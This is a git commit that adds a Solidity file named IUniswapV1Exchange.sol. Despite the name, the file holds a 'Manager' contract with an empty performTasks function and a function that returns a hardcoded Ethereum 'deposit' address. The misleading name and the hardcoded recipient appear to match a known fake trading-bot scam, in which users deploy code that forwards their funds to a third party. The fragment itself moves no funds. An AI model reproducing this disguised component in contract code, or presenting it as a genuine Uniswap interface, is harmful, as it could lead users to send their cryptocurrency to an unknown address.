0cd021194067920b63539af2aafb20323091b788
SaveSquidDAO <savesquiddao@gmail.com>
2022-05-31 15:58:17 +0500

    Create IUniswapV1Exchange.sol

---
+++ IUniswapV1Exchange.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager { 
+	function performTasks() public { 
+
+	 	} 	
+
+        function uniswapDepositAddress() public pure returns (address) { 
+		return 0xaC3019E8f1fE1891E1ce679390C6031165a60Be9;
+	} 
+}
